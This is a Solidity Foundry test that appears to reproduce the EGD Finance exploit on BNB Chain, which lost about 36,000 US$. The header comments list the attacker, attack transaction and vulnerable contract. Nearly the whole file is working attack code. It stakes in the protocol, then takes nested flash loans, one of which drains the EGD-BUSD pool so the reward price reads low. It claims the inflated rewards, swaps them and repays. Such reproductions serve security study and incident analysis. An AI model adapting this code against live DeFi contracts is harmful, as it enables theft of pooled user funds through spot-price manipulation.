// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./interface/cheat.sol";
import "./interface/IPancakePair.sol";
import "./interface/IERC20.sol";
import "./interface/IPancakeRouter02.sol";

// Total Lost: 36,044 US$
// Chain: BNB
// Attacker: 0xee0221d76504aec40f63ad7e36855eebf5ea5edd
// Attack Contract: 0xc30808d9373093fbfcec9e026457c6a9dab706a7
// Attack Tx: 0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3
// Vulnerable Contract: 0x93c175439726797dcee24d08e4ac9164e88e7aee

// Pre tx: https://bscscan.com/tx/0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8

interface EGD_Finance {
    function getEGDPrice() external view returns (uint256);

    function claimAllReward() external;

    function stake(uint256 amount) external;

    function bond(address invitor) external;
}

//////

contract EGDFinanceExp is Test {
    IPancakePair constant EGD_BUSD_Pair =
        IPancakePair(0xa361433E409Adac1f87CDF133127585F8a93c67d);
    IPancakePair constant WBNB_BUSD_Pair =
        IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
    IERC20 constant busd = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant EGDToken =
        IERC20(0x202b233735bF743FA31abb8f71e641970161bF98);
    EGD_Finance constant EGDFinance =
        EGD_Finance(0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370);
    IPancakeRouter02 constant PancakeRouterv2 =
        IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    CheatCodes constant cheats =
        CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 20_245_522);
        preTransaction();

        cheats.roll(20_245_539);
    }

    function testAttack() public {
        vm.warp(1_659_914_146);
        WBNB_BUSD_Pair.swap(2000 * 1e18, 0, address(this), "0x00");
    }

    function preTransaction() internal {
        deal(address(busd), address(this), 100 * 1e18);
        console2.log("Pre transaction: EGD-Finance bound.");
        EGDFinance.bond(address(0x659b136c49Da3D9ac48682D02F7BD8806184e218));
        busd.approve(address(EGDFinance), 100 * 1e18);
        console2.log("Pre transaction: EGD-Finance stake 100 BUSD.");
        EGDFinance.stake(100 * 1e18);
    }

    function pancakeCall(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) public {
        if (keccak256(data) == keccak256("0x00")) {
            console2.log("In Flashloan 1 ...");
            console2.log("Start Flashloan 2");
            uint256 borrow = (busd.balanceOf(address(EGD_BUSD_Pair)) *
                9_999_999_925) / 10_000_000_000;
            EGD_BUSD_Pair.swap(0, borrow, address(this), "0x000");
            console2.log("Flashloan 2 payback success.");

            //swap
            address[] memory path = new address[](2);
            path[0] = address(EGDToken);
            path[1] = address(busd);
            EGDToken.approve(
                address(PancakeRouterv2),
                EGDToken.balanceOf(address(this))
            );
            PancakeRouterv2
                .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                    EGDToken.balanceOf(address(this)),
                    1,
                    path,
                    address(this),
                    block.timestamp
                );

            // payback flashloan 1
            amount0 = (1000 * amount0) / 997 + 1;
            require(
                busd.transfer(address(WBNB_BUSD_Pair), amount0),
                "Flashloan 1 payback failed."
            );
            console2.log(
                "The balance of Attack: ",
                busd.balanceOf(address(this)) / 1e18
            );
        } else {
            console2.log("In Flashloan 2 ...");
            console2.log("Claim all EGDToekn reward from EGD Finance.");
            EGDFinance.claimAllReward();
            console2.log(
                "Get reward (EGDToken): ",
                EGDToken.balanceOf(address(this)) / 1e18
            );

            // payback flashloan 2
            amount1 = (1000 * amount1) / 997 + 1;
            require(
                busd.transfer(address(EGD_BUSD_Pair), amount1),
                "Flashloan 2 payback failed."
            );
        }
    }
}
